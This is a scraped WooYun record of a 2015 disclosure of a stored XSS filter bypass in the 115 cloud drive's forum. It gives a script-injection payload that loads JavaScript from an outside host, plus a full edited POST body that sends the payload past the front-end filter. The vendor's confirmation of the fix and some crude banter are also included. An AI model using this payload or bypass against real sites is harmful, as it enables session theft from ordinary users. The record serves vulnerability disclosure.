{"id": 38730, "wybug_id": "wooyun-2015-095587", "wybug_title": "115网盘存储型xss第三次强势绕过（逻辑问题）", "wybug_corp": "115网盘", "wybug_author": "Mr .LZH", "wybug_date": "2015-02-05 09:53", "wybug_open_date": "2015-03-19 10:25", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-19：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 想要找出新的方法绕过还是比较难的，因为过滤得都差不多了，但这一次强绕却是因为修复逻辑问题。圈子帖子浏览量非常大，一天盗取10万用户不是问题，过滤很多东西，绕起来很难了，剑心你再给我小厂商我爆你菊。 详细说明：  上一次发的漏洞： WooYun: 115网盘存储型xss过滤再一次强势绕过 刚刚收到已经修复的信息，于是再看一下，发现逻辑问题，可继续实现xss。我们继续看一下是如何修复的。继续用html模式编辑帖子，输入payload：<p>xss <script SRC=\"http://ha.ckers.org/xss.js\" xss< p>点击发帖时，编辑器会恢复为普通编辑模式，这时候取消，再转换为html编辑模式，发现已经被过滤。\n\n\n\n不做修改，发帖后，在后台又经过一次过滤，最终payload变成:<p>xss<p>直接输出。\n\n整理一下，变化规律按顺序是：<p>xss <script SRC=\"http://ha.ckers.org/xss.js\" xss< p><p>xss &lt;script SRC=&quot;http://ha.ckers.org/xss.js&quot; xss&lt; p&gt;</p><p>xss <p>但是这种过滤主要是前端过滤，而后台过滤部分也是存在一种说不清的逻辑问题，只要我们编辑数据包，就可以绕过。\n发生数据：gid=133130&allow_notice=1&fids=&pickcodes=&category=&anonymous=0&allow_cates=&allow_uids=&validate=fsuv&7it26sgd4rlvh=OGIxYTJiNGYxMzYxYzVmOGZhOGZmYTQzfDE0MjMwMjM3NjE!&offer_reward=0&fb_price=10&addition=&subject=aaa&content=<p>xss <script SRC=\"http://ha.ckers.org/xss.js\" xss< p>&\n结果如下图：\n\n   漏洞证明：     修复方案：  前端过滤改为后台过滤。查一下过滤的逻辑问题。另外，部分功能的测试需要账号有vip权限，我的账号没有vip，能不能给个测试用的vip账号，测试完还给你们。   版权声明：转载请注明来源 Mr .LZH@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-02-05 10:09 厂商回复： 问题确实存在，谢谢反馈！ 最新状态： 2015-03-19：   ", "replys": "漏洞评价：\n评论\n     2015-02-05 10:12 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:22        | 还需要等待.........)\t\t \n  剑心你再给我小厂商我爆你菊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}